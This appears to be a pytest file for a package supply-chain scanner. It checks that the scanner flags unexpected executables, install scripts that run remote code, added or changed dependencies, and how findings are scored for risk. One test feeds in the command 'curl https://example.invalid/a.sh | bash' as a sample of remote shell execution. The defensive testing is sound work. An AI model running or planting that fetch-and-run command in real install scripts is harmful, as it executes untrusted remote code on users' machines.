

from risk_engine import assess_risk

from security_checks import (
    detect_unexpected_files,
    inspect_install_script,
    compare_dependencies
)

from risk_engine import assess_risk


def test_unexpected_executable():
    results = detect_unexpected_files([
        "scripts/postinstall.js"
    ])

    assert len(results) == 1
    assert results[0]["category"] == "unexpected_executable"


def test_remote_shell_detection():
    results = inspect_install_script(
        "postinstall.js",
        "curl https://example.invalid/a.sh | bash"
    )

    categories = [x["category"] for x in results]

    assert "remote_shell_execution" in categories


def test_new_dependency():
    source = {
        "dependencies": {
            "express": "^4.18.0"
        }
    }

    published = {
        "dependencies": {
            "express": "^4.18.0",
            "unknown-library": "^1.0.0"
        }
    }

    results = compare_dependencies(source, published)

    assert any(
        x["category"] == "added_dependency"
        for x in results
    )


def test_risk_report():
    findings = [
        {
            "category": "remote_shell_execution",
            "file": "postinstall.js",
            "risk": "HIGH",
            "reason": "Remote shell execution detected",
            "evidence": "curl piped to bash"
        }
    ]

    result = assess_risk(findings)

    assert result["overall_risk"] == "HIGH"


from main import analyze_package


def test_harmless_package_returns_low_risk():
    source = {
        "name": "demo-package",
        "version": "1.0.0",
        "repository": "https://github.com/demo/demo",
        "dependencies": {
            "express": "^4.18.0"
        }
    }

    published = source.copy()

    report = analyze_package(
        added_files=[],
        scripts={},
        source_package=source,
        published_package=published
    )

    assert report["overall_risk"] == "LOW"
    assert report["risk_score"] == 0
    assert report["total_findings"] == 0
    assert report["findings"] == []


def test_dependency_version_change_is_detected():
    source = {
        "name": "demo-package",
        "version": "1.0.0",
        "dependencies": {
            "express": "^4.18.0"
        }
    }

    published = {
        "name": "demo-package",
        "version": "1.0.0",
        "dependencies": {
            "express": "^5.0.0"
        }
    }

    report = analyze_package(
        added_files=[],
        scripts={},
        source_package=source,
        published_package=published
    )

    assert report["total_findings"] > 0
    assert any(
        finding["category"] == "dependency_version_changed"
        for finding in report["findings"]
    )



def test_critical_finding_forces_high_risk():
    findings = [
        {
            "category": "remote_shell_execution",
            "file": "scripts/install.js",
            "risk": "HIGH",
            "reason": "Remote shell execution detected",
            "evidence": "Matched static pattern"
        }
    ]

    report = assess_risk(findings)

    assert report["overall_risk"] == "HIGH"
    assert report["risk_score"] == 40

def test_duplicate_findings_are_not_double_counted():
    findings = [
        {
            "file": "install.js",
            "category": "remote_download"
        },
        {
            "file": "install.js",
            "category": "remote_download"
        }
    ]

    report = assess_risk(findings)

    assert report["risk_score"] == 15
    assert report["total_findings"] == 2
    assert report["overall_risk"] == "LOW"


def test_different_categories_in_same_file_are_counted():
    findings = [
        {
            "file": "install.js",
            "category": "remote_download"
        },
        {
            "file": "install.js",
            "category": "child_process"
        }
    ]

    report = assess_risk(findings)

    assert report["risk_score"] == 25
    assert report["total_findings"] == 2
    assert report["overall_risk"] == "MEDIUM"
